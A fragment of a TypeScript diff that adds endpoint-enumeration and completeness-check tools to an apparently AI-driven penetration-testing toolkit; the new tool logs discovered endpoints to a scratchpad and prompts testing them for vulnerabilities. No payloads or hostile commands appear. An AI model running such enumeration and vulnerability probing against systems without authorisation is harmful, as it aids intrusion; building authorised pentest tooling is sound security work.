+          }
+        }
+      }
+
+      // Record discovery in scratchpad
+      const note = `Endpoint Enumeration Results for ${pattern}:
+Found ${discovered.length} endpoints:
+${discovered.map(d => `- ${d.endpoint} [${d.method}] → HTTP ${d.status}`).join('\n')}
+
+Not found: ${(range.max - range.min + 1 - discovered.length)} endpoints returned 404`;
+
+      await createScratchpadTool(session).execute({
+        note,
+        category: 'result',
+        toolCallDescription: 'Recording enumeration results'
+      });
+
+      return {
+        success: true,
+        discovered,
+        total: range.max - range.min + 1,
+        foundCount: discovered.length,
+        notFoundCount: (range.max - range.min + 1) - discovered.length,
+        message: `Found ${discovered.length}/${range.max - range.min + 1} endpoints`,
+        nextAction: discovered.length > 0
+          ? `Test each discovered endpoint for vulnerabilities`
+          : `Pattern ${pattern} not found - try different pattern`
+      };
+    }
+  });
+}
+
 // Export tools creator function that accepts a session
 export function createPentestTools(session: Session, model?: AIModel) {
   return {
@@ -1861,6 +2799,8 @@ export function createPentestTools(session: Session, model?: AIModel) {
     record_test_result: createRecordTestResultTool(session),
     test_parameter: createSmartTestTool(session, model || 'claude-sonnet-4-20250514'),
     check_testing_coverage: createCheckTestingCoverageTool(session),
+    validate_completeness: createValidateCompletenessTool(session),
+    enumerate_endpoints: createEnumerateEndpointsTool(session),
     analyze_scan: analyzeScan,
     scratchpad: createScratchpadTool(session),
     generate_report: createGenerateReportTool(session),
